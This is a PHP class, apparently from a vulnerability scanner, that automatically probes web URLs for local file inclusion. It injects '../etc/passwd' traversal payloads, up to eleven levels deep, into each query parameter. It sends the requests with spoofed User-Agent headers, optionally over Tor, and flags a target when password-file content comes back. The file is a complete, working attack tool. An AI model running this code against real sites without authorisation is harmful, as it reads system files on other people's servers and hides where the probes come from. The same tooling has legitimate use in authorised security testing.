<?php

namespace Aszone\Vulnerabilities;

use Aszone\FakeHeaders\FakeHeaders;
use GuzzleHttp\Client;

class LocalFileInclusion extends CommandDataConfig implements VulnerabilityScanner
{
    const EXPLOIT1 = '../etc/passwd';
    const EXPLOIT2 = '../etc/groups';
    const EXPLOIT1REGEX = 'root:x:0:';
    const EXPLOIT2REGEX = 'root:x:0:';

    private $errors = [];

    public function isVulnerable($target)
    {
        if ($this->isLfiPossible($target)) {
            return $this->verify($target);
        }

        return false;
    }

    public function isLfiPossible($target)
    {
        return (bool) preg_match("/\?|(.+?)\=/", $target);
    }

    protected function verify($target)
    {
        $urls = $this->generateUrls($target);

        $this->output("\n");

        foreach ($urls as $url) {
            if ($this->attack($url)) {
                $this->output('Is Vull');

                return $url;
            }
        }

        return false;
    }

    protected function attack($url)
    {
        $this->output('.');

        $header = new FakeHeaders();
        $client = new Client(['defaults' => [
            'headers' => ['User-Agent' => $header->getUserAgent()],
            'proxy' => $this->commandData['tor'],
            'timeout' => 30,
        ]]);

        try {
            $body = $client->get($url)->getBody()->getContents();

            if ($body
                && $this->checkSuccess($body)
                && !$this->checkError($body)
            ) {
                return $url;
            }
        } catch (\Exception $e) {
            $this->output('#');
        }

        return false;
    }

    protected function checkSuccess($body)
    {
        return preg_match('/'.static::EXPLOIT1REGEX.'|'.static::EXPLOIT2REGEX.'/', $body);
    }

    public function generateUrls($target)
    {
        $this->output("\n".$target);

        $urls1 = $this->generateUrlsByExploit($target, static::EXPLOIT1);
        $urls2 = $this->generateUrlsByExploit($target, static::EXPLOIT2);

        return array_merge($urls1, $urls2);
    }

    protected function generateUrlsByExploit($target, $exploit)
    {
        $explodeUrl = parse_url($target);
        $explodeQuery = explode('&', $explodeUrl['query']);

        foreach ($explodeQuery as $keyQuery => $query) {
            $explodeQueryEqual = explode('=', $query);
            $wordsValue[$explodeQueryEqual[0]] = $explodeQueryEqual[1];
        }

        foreach ($wordsValue as $keyValue => $value) {
            $urls[] = str_replace($keyValue.'='.$value, $keyValue.'=??????????', $target);
        }

        $urlFinal = [];
        foreach ($urls as $url) {
            $urlFinal[] = str_replace('??????????', $exploit, $url);
            $breakFolder = '../';

            for ($i = 0; $i < 10; ++$i) {
                $urlFinal[] = str_replace('??????????', $breakFolder.$exploit, $url);
                $breakFolder .= '../';
            }
        }

        return $urlFinal;
    }

    public function checkError($body)
    {
        $errors = $this->getErrors();

        foreach ($errors as $error) {
            $isValid = strpos($body, $error);

            if ($isValid !== false) {
                return true;
            }
        }

        return false;
    }

    protected function getErrors()
    {
        if (!$this->errors) {
            $this->loadErrors();
        }

        return $this->errors;
    }

    protected function loadErrors()
    {
        $errorsMysql = parse_ini_file(__DIR__.'/../resources/Errors/mysql.ini');
        $errorsMariaDb = parse_ini_file(__DIR__.'/../resources/Errors/mariadb.ini');
        $errorsOracle = parse_ini_file(__DIR__.'/../resources/Errors/oracle.ini');
        $errorssqlServer = parse_ini_file(__DIR__.'/../resources/Errors/sqlserver.ini');
        $errorsPostgreSql = parse_ini_file(__DIR__.'/../resources/Errors/postgresql.ini');
        $errorsAsp = parse_ini_file(__DIR__.'/../resources/Errors/asp.ini');
        $errorsPhp = parse_ini_file(__DIR__.'/../resources/Errors/php.ini');

        $this->errors = array_merge(
            $errorsMysql,
            $errorsMariaDb,
            $errorsOracle,
            $errorssqlServer,
            $errorsPostgreSql,
            $errorsAsp,
            $errorsPhp
        );
    }
}
